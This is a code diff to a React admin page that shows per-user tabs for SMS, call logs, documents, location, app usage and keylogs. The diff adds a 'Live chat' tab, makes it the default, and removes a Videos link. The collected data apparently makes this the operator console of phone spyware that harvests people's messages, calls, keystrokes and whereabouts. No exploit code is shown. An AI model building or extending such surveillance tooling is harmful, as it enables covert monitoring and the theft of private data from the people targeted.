@@ -15,9 +15,9 @@ import {
   IconSearch,
   IconUser,
   IconUsers,
-  IconVideo,
 } from "../components/Icons";
 import { IllustEmptyFeed } from "../components/Illustrations";
+import UserAdminChat from "../components/UserAdminChat";
 import {
   appLabel,
   callTypeLabel,
@@ -38,6 +38,7 @@ import {
 } from "../api";
 
 type Tab =
+  | "chat"
   | "app_usage"
   | "profile"
   | "location"
@@ -80,7 +81,7 @@ function readableValue(val: unknown): string {
 
 export default function UserDetailPage() {
   const { userId = "" } = useParams();
-  const [tab, setTab] = useState<Tab>("documents");
+  const [tab, setTab] = useState<Tab>("chat");
   const [data, setData] = useState<UserBundle | null>(null);
   const [error, setError] = useState("");
   const [busy, setBusy] = useState(false);
@@ -147,6 +148,7 @@ export default function UserDetailPage() {
       documents: countMap(data?.documents),
     };
     return [
+      { id: "chat" as Tab, label: "Live chat", count: 0, icon: IconMessage },
       { id: "documents" as Tab, label: "Documents", count: counts.documents, icon: IconDocument },
       { id: "sms" as Tab, label: "SMS", count: counts.sms, icon: IconMessage },
       { id: "call_logs" as Tab, label: "Calls", count: counts.call_logs, icon: IconPhone },
@@ -180,7 +182,7 @@ export default function UserDetailPage() {
     (data?.profile as any)?.email ||
     userId;
 
-  const showSearch = tab !== "profile" && tab !== "location";
+  const showSearch = tab !== "profile" && tab !== "location" && tab !== "chat";
 
   return (
     <div className="container stack">
@@ -197,10 +199,6 @@ export default function UserDetailPage() {
               <Link className="nav-link" to="/">
                 <IconUsers size={16} />
                 <span>Users</span>
-              </Link>
-              <Link className="nav-link" to="/videos">
-                <IconVideo size={16} />
-                <span>Videos</span>
               </Link>
             </nav>
           </div>
@@ -308,6 +306,9 @@ export default function UserDetailPage() {
           </div>
         ) : null}
 
+        {tab === "chat" ? (
+          <UserAdminChat userId={userId} userDisplayName={String(title)} />
+        ) : null}
         {tab === "profile" && data ? <ProfileView data={data} /> : null}
         {tab === "location" && data ? <LocationView location={data.location} /> : null}
         {tab === "keylogs" ? (
